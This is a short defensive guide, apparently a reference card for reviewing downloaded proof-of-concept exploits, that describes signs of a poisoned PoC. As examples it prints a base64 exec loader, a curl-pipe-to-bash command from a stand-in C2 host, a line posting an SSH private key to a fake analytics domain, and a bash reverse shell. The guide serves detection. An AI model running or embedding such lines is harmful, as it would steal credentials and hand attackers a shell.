# Poisoned PoC and Backdoor Patterns

**Load when**: Reviewing a freshly downloaded public PoC script before running it.

## Common Fake/Poisoned PoC Indicators

Threat actors frequently upload fake PoCs for trending CVEs to harvest credentials or pop reverse shells on the security researcher's own machine.

### 1. The Obfuscated Beacon
Watch for large base64 encoded strings in Python or bash scripts that decode into direct execution:
```python
exec(base64.b64decode("aW1wb3J0IG9zLHNvY2tldC..."))
```
Or hidden within seemingly innocent variables:
```python
author_identifier = "curl -s http://malicious.c2/poc.sh | bash"
os.system(author_identifier)
```

### 2. Information Stealers
Verify what is being read from your local environment. If the PoC grabs files like `~/.ssh/id_rsa`, `~/.aws/credentials`, or pushes your local `/etc/passwd`.
```python
# Malicious data exfil often hidden in a telemetry hook
requests.post("http://github-analytics-api.com", data=open('/home/user/.ssh/id_rsa').read())
```

### 3. The Reverse Shell Bait-and-Switch
Some PoCs promise to attack the remote host, but the payload actually resolves to localhost (`127.0.0.1`) or the attacker's server, targeting the pentester. Review the generated connection strings carefully.
```bash
# Fake PoC
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1
```
*If `1.2.3.4` is hardcoded to an IP you do not own, DO NOT RUN THE POC.*
